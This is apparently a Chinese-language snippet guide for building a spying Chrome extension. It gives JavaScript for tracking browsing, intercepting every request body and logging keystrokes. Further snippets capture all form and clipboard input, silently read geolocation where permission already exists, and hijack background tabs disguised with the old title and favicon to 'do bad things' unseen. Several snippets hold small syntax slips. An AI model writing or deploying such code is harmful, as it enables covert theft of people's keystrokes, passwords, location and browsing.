### 跟踪用户的浏览活动

background.js

```bash
chrome.webNavigation.onCompleted.addListener((details) => {
  // {
  //   "documentId": "F5009EFE5D3C074730E67F5C1D934C0A",
  //   "documentLifecycle": "active",
  //   "frameId": 0,
  //   "frameType": "outermost_frame",
  //   "parentFrameId": -1,
  //   "processId": 139,
  //   "tabId": 174034187,
  //   "timeStamp": 1676958729790.8088,
  //   "url": "https://www.linkedin.com/feed/"
  // }
});
```

### 监视所有网络流量

background.js:

```bash
chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    if (details.requestBody) {
      // Capture requestBody data
    }
  },
  {
    urls: ["<all_urls>"],
  },
  ["requestBody"]
);
```

### 键盘记录器

```bash
let buffer = "";

const debouncedCaptureKeylogBuffer = _.debounce(async () => {
  if (buffer.length > 0) {
    // Flush the buffer

    buffer = "";
  }
}, 1000);

document.addEventListener("keyup", (e: KeyboardEvent) => {
  buffer += e.key;

  debouncedCaptureKeylogBuffer();
});
```

### 输入捕获

```bash
[...document.querySelectorAll("input,textarea,[contenteditable]")].map((input) =>
  input.addEventListener("input", _.debounce((e) => {
    // Read input value
  }, 1000))
);
```

监视整个页面

```bash
const inputs: WeakSet<Element> = new WeakSet();

const debouncedHandler = _.debounce(() => {
  [...document.querySelectorAll("input,textarea,[contenteditable")]
    .filter((input: Element) => !inputs.has(input))
    .map((input) => {
      input.addEventListener(
        "input",
        _.debounce((e) => {
          // Read input value
        }, 1000)
      );

      inputs.add(input);
    });
}, 1000);

const observer = new MutationObserver(() => debouncedHandler());
observer.observe(document.body, { subtree: true, childList: true });
```

### 剪贴板捕获

```bash
document.addEventListener("copy", () => {
  const selected = window.getSelection()?.toString();

  // Capture selected text on copy events
});
```

### 捕获地理位置

popup.js:

```bash
navigator.geolocation.getCurrentPosition(
  (position) => {
    // Capture position
  },
  (e) => {},
  {
    enableHighAccuracy: true,
    timeout: 5000,
    maximumAge: 0,
  }
);
```

检查页面是否已具有地理位置权限。如果已具有，我们可以默默请求位置

content.js:

```bash
navigator.permissions
  .query({ name: "geolocation" })
  .then(({ state }: { state: string }) => {
    if (state === "granted") {
      captureGeolocation();
    }
  });
```

### 隐身标签

background.js:

```bash
export async function openStealthTab() {
  const tabs = await chrome.tabs.query({
    // Don't use the tab the user is looking at
    active: false,
    // Don't use pinned tabs, they're probably used frequently
    pinned: false,
    // Don't use a tab generating audio
    audible: false,
    // Don't use a tab until it is finished loading
    status: "complete",
  });

  const [eligibleTab] = tabs.filter((tab) => {
    // Must have url and id
    if (!tab.id || !tab.url) {
      return false;
    }

    // Don't use extension pages
    if (new URL(tab.url).protocol === "chrome-extension:") {
      return false;
    }

    return true;
  });

  if (eligibleTab) {
    // These values will be used to spoof the current page
    // and navigate back
    const searchParams = new URLSearchParams({
      returnUrl: eligibleTab.url as string,
      faviconUrl: eligibleTab.favIconUrl || "",
      title: eligibleTab.title || "",
    });

    const url = `${chrome.runtime.getURL(
      "stealth-tab.html"
    )}?${searchParams.toString()}`;

    // Open the stealth tab
    await chrome.tabs.update(eligibleTab.id, {
      url,
      active: false,
    });
  }
}
```

stealth-tab.js:

```bash
const searchParams = new URL(window.location.href).searchParams;

// Spoof the previous page tab appearance
document.title = searchParams.get('title);
document.querySelector(`link[rel="icon"]`)
  .setAttribute("href", searchParams.get('faviconUrl'));

function useReturnUrl() {
  // User focused this tab, flee!
  window.location.href = searchParams.get('returnUrl');
}

// Check to see if this page is visible on load
if (document.visibilityState === "visible") {
  useReturnUrl();
}

document.addEventListener("visibilitychange", () => useReturnUrl());

// Now do bad things

// Done doing bad things, return!
useReturnUrl();
```
